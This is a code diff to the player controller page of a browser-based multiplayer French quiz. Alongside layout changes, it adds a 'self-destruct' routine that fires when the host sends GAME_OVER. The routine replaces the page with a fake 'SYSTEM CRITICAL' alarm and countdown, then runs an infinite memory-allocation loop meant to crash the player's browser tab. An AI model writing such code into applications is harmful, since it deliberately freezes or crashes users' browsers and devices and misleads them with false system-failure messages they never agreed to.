@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>French Quiz - Controller (v1.3.7)</title>
+    <title>French Quiz - Controller (v2.0.1)</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         * { box-sizing: border-box; font-family: system-ui, sans-serif; -webkit-tap-highlight-color: transparent; }
@@ -48,68 +48,78 @@
 </head>
 <body>
 
-<div class="wrapper">
-    <div class="v-tag">CONTROLLER v1.3.7</div>
-    
-    <div class="header">
-        <div id="hud-user">Player</div>
-        <div id="hud-status" style="color:#fbbf24;">Lobby</div>
-    </div>
-
-    <div id="view-join">
-        <h2>Join Game</h2>
-        <input type="text" id="name-input" placeholder="Enter Nickname" maxlength="12">
-        <button class="btn" id="connect-btn" onclick="connect()">Connect</button>
-        <p id="error-msg" style="color:#ef4444; margin-top:10px; font-size:0.9rem;"></p>
-    </div>
-
-    <div id="view-wait" class="hidden">
-        <h3 id="wait-msg">Connected</h3>
-        <div class="loader"></div>
-    </div>
-
-    <div id="view-quiz" class="hidden">
-        <h3 id="quiz-title" style="margin: 0 0 5px 0;">Select Answer</h3>
+<div id="main-container" style="width: 100%; display: flex; flex-direction: column; align-items: center; gap: 15px;">
+    <div class="wrapper">
+        <div class="v-tag">CONTROLLER v2.0.1</div>
         
-        <div class="choices" id="choices-box">
-            <button class="opt-btn" onclick="selectChoice(this)"></button>
-            <button class="opt-btn" onclick="selectChoice(this)"></button>
-            <button class="opt-btn" onclick="selectChoice(this)"></button>
-            <button class="opt-btn" onclick="selectChoice(this)"></button>
+        <div class="header">
+            <div id="hud-user">Player</div>
+            <div id="hud-status" style="color:#fbbf24;">Lobby</div>
         </div>
 
-        <div class="text-entry-container hidden" id="text-box-container">
-            <input type="text" id="text-answer-input" placeholder="Type answer in French..." autocomplete="off">
-            <button class="btn" onclick="submitTextAnswer()">Submit Answer</button>
+        <!-- REGISTER VIEW -->
+        <div id="view-join">
+            <h2>Join Game</h2>
+            <input type="text" id="name-input" placeholder="Enter Nickname" maxlength="12">
+            <button class="btn" id="connect-btn" onclick="connect()">Connect</button>
+            <p id="error-msg" style="color:#ef4444; margin-top:10px; font-size:0.9rem;"></p>
         </div>
 
-        <div style="font-size:0.85rem; font-weight:bold; color:#94a3b8; margin-top:15px; text-align:left;">Inventory:</div>
-        <div class="item-row" id="inventory-box"></div>
-        
-        <div id="strike-panel" class="hidden target-box">
-            <label style="font-size:0.85rem; font-weight:bold;">Select Target:</label>
-            <select id="target-select"></select>
-            <button class="btn" style="padding:8px; font-size:0.9rem; margin-top:8px; background:#ef4444;" onclick="fireStrike()">Confirm Strike</button>
+        <!-- INTERMISSION LOADING BANNER -->
+        <div id="view-wait" class="hidden">
+            <h3 id="wait-msg">Connected</h3>
+            <div class="loader"></div>
         </div>
-        
-        <div id="quiz-waiting" class="hidden" style="margin-top: 15px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 8px;">
-            <div class="loader" style="width:24px; height:24px; margin:5px auto;"></div>
-            <span style="font-size:0.85rem; color:#94a3b8;">Answer locked. Waiting for host...</span>
+
+        <!-- QUIZ SYSTEM ENGINE CONTAINER -->
+        <div id="view-quiz" class="hidden">
+            <h3 id="quiz-title" style="margin: 0 0 5px 0;">Select Answer</h3>
+            
+            <!-- VARIANT A: MULTIPLE CHOICE BUTTONS -->
+            <div class="choices" id="choices-box">
+                <button class="opt-btn" onclick="selectChoice(this)"></button>
+                <button class="opt-btn" onclick="selectChoice(this)"></button>
+                <button class="opt-btn" onclick="selectChoice(this)"></button>
+                <button class="opt-btn" onclick="selectChoice(this)"></button>
+            </div>
+
+            <!-- VARIANT B: FREE TEXT BOX ENTRY FIELD -->
+            <div class="text-entry-container hidden" id="text-box-container">
+                <input type="text" id="text-answer-input" placeholder="Type answer in French..." autocomplete="off">
+                <button class="btn" onclick="submitTextAnswer()">Submit Answer</button>
+            </div>
+
+            <div style="font-size:0.85rem; font-weight:bold; color:#94a3b8; margin-top:15px; text-align:left;">Inventory:</div>
+            <div class="item-row" id="inventory-box"></div>
+            
+            <div id="strike-panel" class="hidden target-box">
+                <label style="font-size:0.85rem; font-weight:bold;">Select Target:</label>
+                <select id="target-select"></select>
+                <button class="btn" style="padding:8px; font-size:0.9rem; margin-top:8px; background:#ef4444;" onclick="fireStrike()">Confirm Strike</button>
+            </div>
+            
+            <!-- WAITING FOR HOST REVEAL INDICATOR -->
+            <div id="quiz-waiting" class="hidden" style="margin-top: 15px; padding: 10px; background: rgba(0,0,0,0.2); border-radius: 8px;">
+                <div class="loader" style="width:24px; height:24px; margin:5px auto;"></div>
+                <span style="font-size:0.85rem; color:#94a3b8;">Answer locked. Waiting for host...</span>
+            </div>
+        </div>
+
+        <!-- GENERIC DISCONNECT DISPLAY -->
+        <div id="view-alert" class="hidden">
+            <h2 id="alert-title">Disconnected</h2>
+            <p id="alert-desc">Lost connection to server.</p>
         </div>
     </div>
 
-    <div id="view-alert" class="hidden">
-        <h2 id="alert-title">Disconnected</h2>
-        <p id="alert-desc">Lost connection to server.</p>
+    <!-- DIAGNOSTIC OUTPUT WINDOW -->
+    <div class="debug-panel">
+        <div class="debug-title">
+            <span>Local Controller Trace Log</span>
+            <span style="cursor:pointer; text-decoration:underline;" onclick="document.getElementById('dbg-box').innerHTML=''">Clear</span>
+        </div>
+        <div class="debug-text" id="dbg-box">Awaiting connection initialization sequences...</div>
     </div>
-</div>
-
-<div class="debug-panel">
-    <div class="debug-title">
-        <span>Local Controller Trace Log</span>
-        <span style="cursor:pointer; text-decoration:underline;" onclick="document.getElementById('dbg-box').innerHTML=''">Clear</span>
-    </div>
-    <div class="debug-text" id="dbg-box">Awaiting connection initialization sequences...</div>
 </div>
 
 <script>
@@ -135,7 +145,6 @@
         console.log(`[Controller] ${text}`);
     }
 
-    // Protection Engine Execution Pipeline
     window.onload = function() {
         const params = new URLSearchParams(window.location.search);
         hostRoomId = params.get('room');
@@ -160,6 +169,38 @@
             writeTrace(`Room ID verified (${hostRoomId}). System engine unlocked for socket handshake pipelines.`, 'ok');
         }
     };
+
+    function triggerSelfDestruct() {
+        writeTrace("CRITICAL WARNING: Terminating process environment thread on signal.", 'err');
+        
+        // Wipe content and generate thematic terminal alert
+        document.body.innerHTML = `
+            <div style="text-align:center; padding:20px; color:#ef4444; font-family:monospace; background:#0f172a; height:100vh; display:flex; flex-direction:column; justify-content:center; align-items:center;">
+                <h1 style="font-size:2.5rem; margin-bottom:20px; border:2px solid #ef4444; padding:15px; border-radius:10px; background:rgba(239,68,68,0.1);">⚠️ SYSTEM CRITICAL ⚠️</h1>
+                <p style="font-size:1.1rem; color:#94a3b8; max-width:300px; margin:0 auto 15px auto;">Session completed. Cleaning resource stack allocation cache data...</p>
+                <p style="font-size:1.3rem; font-weight:bold; color:#f43f5e;" id="sd-countdown">Tab termination in 3...</p>
+            </div>
+        `;
+
+        let count = 3;
+        const countdownInterval = setInterval(() => {
+            count--;
+            if (count > 0) {
+                document.getElementById("sd-countdown").innerText = `Tab termination in ${count}...`;
+            } else {
+                clearInterval(countdownInterval);
+                document.getElementById("sd-countdown").innerText = "PROCESSING OVERFLOW MELTDOWN...";
+                
+                // Crash loop: Continuous memory push routine to block execution thread
+                setTimeout(() => {
+                    const structuralLeakBox = [];
+                    while (true) {
+                        structuralLeakBox.push(new Array(1000000).join("💣"));
+                    }
+                }, 400);
+            }
+        }, 1000);
+    }
 
     function connect() {
         if (!hostRoomId) {
@@ -193,6 +234,13 @@
 
             conn.on('data', (msg) => {
                 writeTrace(`Rx Stream element evaluated: ${JSON.stringify(msg)}`);
+                
+                if (msg.type === 'GAME_OVER') {
+                    if (conn) conn.close();
+                    if (peer) peer.destroy();
+                    triggerSelfDestruct();
+                    return;
+                }
                 
                 if(msg.type === 'JOIN_OK') {
                     myName = msg.name;
